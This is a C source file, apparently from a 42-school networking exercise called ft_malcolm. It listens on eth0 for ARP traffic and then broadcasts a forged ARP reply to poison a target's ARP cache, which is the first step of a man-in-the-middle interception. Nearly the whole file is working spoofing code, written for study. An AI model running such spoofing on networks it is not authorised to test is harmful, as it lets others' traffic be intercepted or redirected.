/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   malcolm.c                                          :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: nponchon <nponchon@student.42.fr>          +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2025/11/04 18:38:53 by nponchon          #+#    #+#             */
/*   Updated: 2025/11/24 12:47:38 by nponchon         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "../incs/ft_malcolm.h"

extern int g_sigint;

void	forge_arp(struct ether_arp *original_arp, t_malcolm *m)
{
	struct ether_arp forged_arp;

	ft_memcpy(&forged_arp, original_arp, sizeof(struct ether_arp));
	forged_arp.ea_hdr.ar_op = htons(ARPOP_REPLY);

	sscanf(m->source_mac, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
		&forged_arp.arp_sha[0], &forged_arp.arp_sha[1], &forged_arp.arp_sha[2],
		&forged_arp.arp_sha[3], &forged_arp.arp_sha[4], &forged_arp.arp_sha[5]);
	inet_pton(AF_INET, m->source_ip, forged_arp.arp_spa);

	sscanf(m->target_mac, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
		&forged_arp.arp_tha[0], &forged_arp.arp_tha[1], &forged_arp.arp_tha[2],
		&forged_arp.arp_tha[3], &forged_arp.arp_tha[4], &forged_arp.arp_tha[5]);
	inet_pton(AF_INET, m->target_ip, forged_arp.arp_tpa);

	printf("Forged ARP reply:\n");
	printf("  Sender MAC: %02x:%02x:%02x:%02x:%02x:%02x\n",
		forged_arp.arp_sha[0], forged_arp.arp_sha[1], forged_arp.arp_sha[2],
		forged_arp.arp_sha[3], forged_arp.arp_sha[4], forged_arp.arp_sha[5]);
	printf("  Sender IP: %s\n", m->source_ip);
	printf("  Target MAC: %02x:%02x:%02x:%02x:%02x:%02x\n",
		forged_arp.arp_tha[0], forged_arp.arp_tha[1], forged_arp.arp_tha[2],
		forged_arp.arp_tha[3], forged_arp.arp_tha[4], forged_arp.arp_tha[5]);
	printf("  Target IP: %s\n", m->target_ip);
	printf("  Operation: ARP Reply\n");

}

void	send_arp(t_malcolm *m)
{
	int ifindex = if_nametoindex("eth0");
	if (ifindex == 0) {
		fprintf(stderr, "if_nametoindex failed");
		return;
	}

	unsigned char src_mac[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
	set_sourcemac(m, src_mac);

	// broadcast ARP to force a cache update on the target (unicast does not work well)
	unsigned char broadcast_mac[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};

	struct ether_header eth;
	ft_memcpy(eth.ether_shost, src_mac, 6);
	ft_memcpy(eth.ether_dhost, broadcast_mac, 6);
	eth.ether_type = htons(ETH_P_ARP);

	struct ether_arp arp;
	arp.ea_hdr.ar_hrd = htons(ARPHRD_ETHER);
	arp.ea_hdr.ar_pro = htons(ETH_P_IP);
	arp.ea_hdr.ar_hln = 6;
	arp.ea_hdr.ar_pln = 4;
	arp.ea_hdr.ar_op  = htons(ARPOP_REPLY);
	ft_memcpy(arp.arp_sha, src_mac, 6);
	inet_pton(AF_INET, m->source_ip, arp.arp_spa);
	ft_memcpy(arp.arp_tha, src_mac, 6);
	inet_pton(AF_INET, m->source_ip, arp.arp_tpa);

	unsigned char packet[sizeof(struct ether_header) + sizeof(struct ether_arp)];
	ft_memcpy(packet, &eth, sizeof(eth));
	ft_memcpy(packet + sizeof(eth), &arp, sizeof(arp));

	struct sockaddr_ll sll = {0};
	sll.sll_ifindex = ifindex;
	sll.sll_halen = 6;
	ft_memcpy(sll.sll_addr, broadcast_mac, 6);

	ssize_t bytes_sent = sendto(m->socket, packet, sizeof(packet), 0, (struct sockaddr*)&sll, sizeof(sll));
	if (bytes_sent < 0) {
		fprintf(stderr, "Error: sendto failed\n");
	} else {
		printf("Successfully sent fake ARP reply\n");
	}
}

int	listen_arp(t_malcolm *m)
{
	set_socket(m);

    unsigned char buf[65536];
    struct sockaddr_ll addr;
    socklen_t addrlen = sizeof(addr);

    ft_printf("Listening for packets between A and B...\n");

    while (g_sigint == 0) {
        ssize_t len = recvfrom(m->socket, buf, sizeof(buf), 0,
                            (struct sockaddr*)&addr, &addrlen);
        if (len < 0)
			continue;
        struct ether_header *eth = (struct ether_header*)buf;
        if (ntohs(eth->ether_type) == ETH_P_ARP) 
			break;
    }

	if (g_sigint) // exit on Ctrl+C
		return (0);

	if (m->verbose)
		print_arp(buf);

	send_arp(m);

    return (0);
}
